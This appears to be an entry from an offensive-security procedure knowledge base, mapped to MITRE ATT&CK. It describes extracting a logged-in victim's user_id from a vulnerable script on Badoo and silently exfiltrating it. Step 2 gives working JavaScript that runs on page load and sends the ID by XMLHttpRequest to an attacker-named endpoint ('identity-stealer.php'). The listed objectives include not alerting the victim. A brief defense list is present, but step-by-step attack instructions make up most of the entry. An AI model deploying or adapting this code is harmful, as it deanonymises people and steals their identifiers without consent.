---
tags:
  - javascript
  - exfiltration
  - user-id-extraction
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/unmask-user-and-exfil-js]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 04d5ce49-a107-4a56-9621-e30f56d445f0
created_at: '2025-12-14T17:28:52.094Z'
updated_at: '2025-12-14T17:28:52.094Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Extract-and-Exfiltrate-User-ID

## Summary

This procedure uses client-side JavaScript to parse the exposed user_id from the loaded vulnerable script and exfiltrate it to an attacker-controlled server via HTTP request, enabling collection of victim identifiers.

## Description

In the Badoo attack, after embedding the script, a custom JS function splits the user_id string to extract the value and sends it via XMLHttpRequest. This occurs on page load, silently transmitting data without user interaction. The technique relies on the global scope pollution from the service worker script. Prerequisites: Malicious page hosted and victim visit while logged in.

## Requirements

1. Access to the malicious webpage source
2. Attacker server endpoint for receiving data
3. Knowledge of XMLHttpRequest or Fetch API

## Defense

Defensive measures and detection strategies:

- Remove sensitive data from client-side JS
- Implement referrer policies and monitor outbound requests
- Use browser extensions to block cross-origin exfiltration

## Objectives

1. Parse user_id from script variable
2. Transmit to attacker server
3. Confirm receipt without alerting victim

## Instructions

### Step 1: Define Extraction Function

**Context**: Create a helper to isolate the user_id value.

Add to the HTML: `function UnmaskUser(str) { return str.split('=')[0]; }`.

> This assumes user_id is formatted as 'value='. Expected output: Function returns the ID string.

### Step 2: Execute Extraction and Exfil on Load

**Context**: Trigger parsing and sending when the page loads.

Use [[commands/unmask-user-and-exfil-js]] in a <script> tag:

```javascript
function UnmaskUser(str) { return str.split('=')[0]; } window.onload = function(){ var user = UnmaskUser(user_id); var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' + user , true); xhr.send(); };
```

> Runs after script load, sending GET with victim param. Expected output: Network request to endpoint with user ID.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used

- [[commands/unmask-user-and-exfil-js]]

## Tools Used


## Tags

- [[Exfiltration]]
- [[javascript-execution]]
